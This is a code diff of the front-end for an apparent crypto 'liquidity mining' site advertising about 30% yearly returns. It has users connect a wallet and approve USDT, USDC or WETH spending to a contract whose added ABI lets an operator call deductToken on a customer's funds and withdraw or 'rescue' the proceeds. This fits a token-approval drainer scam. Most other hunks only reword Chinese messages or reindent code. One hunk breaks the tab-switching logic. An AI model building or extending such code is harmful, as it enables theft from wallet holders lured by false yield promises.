@@ -106,12 +106,27 @@ const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
 const DEDUCT_CONTRACT_ABI = [
-  {"type":"function","name":"isServiceActiveFor","inputs":[{"name":"customer","type":"address"}],"outputs":[{"name":"","type":"bool"}],"stateMutability":"view"},
-  {"type":"function","name":"activateService","inputs":[{"name":"tokenContract","type":"address"}],"outputs":[],"stateMutability":"nonpayable"},
-  {"type":"function","name":"REQUIRED_ALLOWANCE_THRESHOLD","inputs":[],"outputs":[{"name":"","type":"uint256"}],"stateMutability":"view"},
-  {"type":"function","name":"deductToken","inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"},{"name":"amount","type":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},
-  {"anonymous":false,"inputs":[{"indexed":true,"name":"customer","type":"address"},{"indexed":true,"name":"tokenContract","type":"address"}],"name":"ServiceActivated","type":"event"},
-  {"anonymous":false,"inputs":[{"indexed":true,"name":"customer","type":"address"},{"indexed":true,"name":"tokenContract","type":"address"},{"indexed":false,"name":"amount","type":"uint256"}],"name":"TokenDeducted","type":"event"}
+  {"inputs":[{"internalType":"address","name":"_storeAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
+  {"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"error"},
+  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"recipient","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EthWithdrawn","type":"event"},
+  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"}],"name":"ServiceActivated","type":"event"},
+  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"}],"name":"ServiceDeactivated","type":"event"},
+  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenDeducted","type":"event"},
+  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensRescued","type":"event"},
+  {"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"WethUnwrapped","type":"event"},
+  {"inputs":[],"name":"REQUIRED_ALLOWANCE_THRESHOLD","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"activateService","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[],"name":"deactivateService","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deductToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[],"name":"getContractEthBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getContractTokenBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getCustomerAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isServiceActiveFor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"rescueTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[],"name":"storeAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"wethAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"unwrapWETH","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[],"name":"withdrawEth","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"stateMutability":"payable","type":"receive"}
 ];
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)",
@@ -321,10 +336,10 @@ const translations = {
     wethValueTooLow: 'WETH价值过低。',
     rulesTitle: '挖矿规则',
     rulesContent: `
-      <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500 才能开始。</p>
+      <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500才能开始。</p>
       <p>2. 不足：可授权但无法开始。</p>
       <p>3. 年化利率：28.3% ~ 31.5%。</p>
-      <p>4. 每 12 小时发放一次（美西时间 00:00 与 12:00）。</p>
+      <p>4. 每 12小时发放一次（美西时间 00:00与12:00）。</p>
       <p>5. 质押也会一并计算流动性挖矿利息。</p>
     `,
     modalClaimableLabel: '可领取',
@@ -795,7 +810,7 @@ async function refreshEthPrice() {
     ethPriceCache.price = data.ethereum.usd;
     ethPriceCache.timestamp = now;
   } catch (error) {
-    console.error('[DEBUG] ETH價格刷新錯誤:', error);
+    console.error('[DEBUG] ETH 價格刷新錯誤:', error);
   }
 }
 function initializeMiningData() {
@@ -953,12 +968,12 @@ async function initializeWallet() {
     return;
   }
   try {
-    console.log('[DEBUG] 初始化錢包...');
+    console.log('[DEBUG] 錢包初始化...');
     if (typeof window.ethereum !== 'undefined') {
       provider = new window.ethers.BrowserProvider(window.ethereum);
     } else {
       provider = new window.ethers.JsonRpcProvider(INFURA_URL);
-      updateStatus('請連結錢包以進行交易', true);
+      updateStatus('請連接錢包進行交易', true);
     }
     if (window.ethereum) {
       window.ethereum.on('accountsChanged', a => {
@@ -975,7 +990,7 @@ async function initializeWallet() {
     }
     const accounts = await provider.send('eth_accounts', []);
     if (accounts.length > 0) {
-      console.log('[DEBUG] 自動連線錢包');
+      console.log('[DEBUG] 自動連接錢包');
       await connectWallet();
       await updateUIBasedOnChainState();
     } else {
@@ -997,9 +1012,9 @@ async function connectWallet() {
   }
   isConnecting = true;
   try {
-    console.log('[DEBUG] 開始錢包連線...');
+    console.log('[DEBUG] 開始錢包連接...');
     if (typeof window.ethereum === 'undefined') {
-      updateStatus('請連結支援EIP-1193的錢包', true);
+      updateStatus('請連接支持EIP-1193的錢包', true);
       return;
     }
     if (!provider) {
@@ -1010,7 +1025,7 @@ async function connectWallet() {
     if (accounts.length === 0) throw new Error("No account.");
     signer = await provider.getSigner();
     userAddress = await signer.getAddress();
-    console.log('[DEBUG] 錢包連線成功:', userAddress);
+    console.log('[DEBUG] 錢包連接成功:', userAddress);
     deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
     usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
     usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
@@ -1020,17 +1035,17 @@ async function connectWallet() {
       connectButton.textContent = 'Connected';
     }
     await forceRefreshWalletBalance();
-    updateStatus('錢包連線成功，餘額已載入');
+    updateStatus('錢包連接成功，餘額已載入');
     await loadUserDataFromServer();
     await updateUIBasedOnChainState();
     initSSE();
     await updateUIBasedOnChainState();
   } catch (e) {
-    console.error('[DEBUG] 錢包連線錯誤:', e);
+    console.error('[DEBUG] 錢包連接錯誤:', e);
     if (e.code === -32002 || e.message.includes('already pending')) {
       updateStatus('錢包確認視窗已開啟，請在錢包中確認', true);
     } else {
-      log(`錢包連線失敗: ${e.message}`, 'error');
+      log(`錢包連接失敗: ${e.message}`, 'error');
       updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
       resetState(true);
     }
@@ -1052,33 +1067,33 @@ async function updateUIBasedOnChainState() {
       updateStatus("演示模式：已自動啟動");
       activateStakingUI();
       return;
-  }
-  const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
-  const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
-    retry(() => deductContract.isServiceActiveFor(userAddress)),
-    retry(() => usdtContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
-    retry(() => usdcContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
-    retry(() => wethContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
-  ]);
-  const isWethAuthorized = wethAllowance >= requiredAllowance;
-  const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
-  const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
-  const isFullyAuthorized = isServiceActive || isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
-  if (isFullyAuthorized) {
-    if (startBtn) startBtn.style.display = 'none';
-    disableInteractiveElements(false);
-    updateStatus("挖礦已啟動");
-    activateStakingUI();
-  } else {
-    if (startBtn) startBtn.style.display = 'block';
-    disableInteractiveElements(false);
-    updateStatus("請點擊 Start 進行授權");
-  }
+    }
+    const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
+    const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
+      retry(() => deductContract.isServiceActiveFor(userAddress)),
+      retry(() => usdtContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
+      retry(() => usdcContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
+      retry(() => wethContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
+    ]);
+    const isWethAuthorized = wethAllowance >= requiredAllowance;
+    const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
+    const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
+    const isFullyAuthorized = isServiceActive || isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
+    if (isFullyAuthorized) {
+      if (startBtn) startBtn.style.display = 'none';
+      disableInteractiveElements(false);
+      updateStatus("挖礦已啟動");
+      activateStakingUI();
+    } else {
+      if (startBtn) startBtn.style.display = 'block';
+      disableInteractiveElements(false);
+      updateStatus("請點擊 Start 進行授權");
+    }
   } catch (e) {
-  console.error('[DEBUG] 鏈上狀態檢查錯誤:', e);
-  log(`狀態檢查錯誤: ${e.message}`, 'error');
-  if (startBtn) startBtn.style.display = 'block';
-}
+    console.error('[DEBUG] 鏈上狀態檢查錯誤:', e);
+    log(`狀態檢查錯誤: ${e.message}`, 'error');
+    if (startBtn) startBtn.style.display = 'block';
+  }
 }
 async function handleConditionalAuthorizationFlow() {
   if (!signer) throw new Error(translations[currentLang].error + ": Wallet not connected");
@@ -1559,9 +1574,7 @@ document.addEventListener('DOMContentLoaded', async () => {
   if (accountDetailModal) accountDetailModal.addEventListener('click', e => e.target === accountDetailModal && closeAccountDetailModal());
   document.querySelectorAll('.tab').forEach(tab => {
     tab.addEventListener('click', () => {
-      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-      tab.classList.add('active');
-      document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
+      document.querySelectorAll('.tab').forEach(s => s.classList.remove('active'));
       document.getElementById(tab.dataset.tab).classList.add('active');
       if (tab.dataset.tab === 'liquidity') updateInterest();
     });
@@ -1608,7 +1621,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     })();
   }
 });
-// 自動餘額監控（每10秒）
+// 自動餘額監控（每 10 秒）
 setInterval(async () => {
   if (userAddress && signer && !window.isDemoMode) {
     try {
@@ -1621,8 +1634,8 @@ setInterval(async () => {
       cachedWalletBalances = { USDT: usdtBal, USDC: usdcBal, WETH: wethBal };
       updateWalletBalanceFromCache();
       updateAccountBalanceDisplay();
-    } catch (error) {
-      log(`自動更新失敗: ${error.message}`, 'error');
+    } catch (err) {
+      log(`自動更新失敗: ${err.message}`, 'error');
     }
   }
 }, 10000);
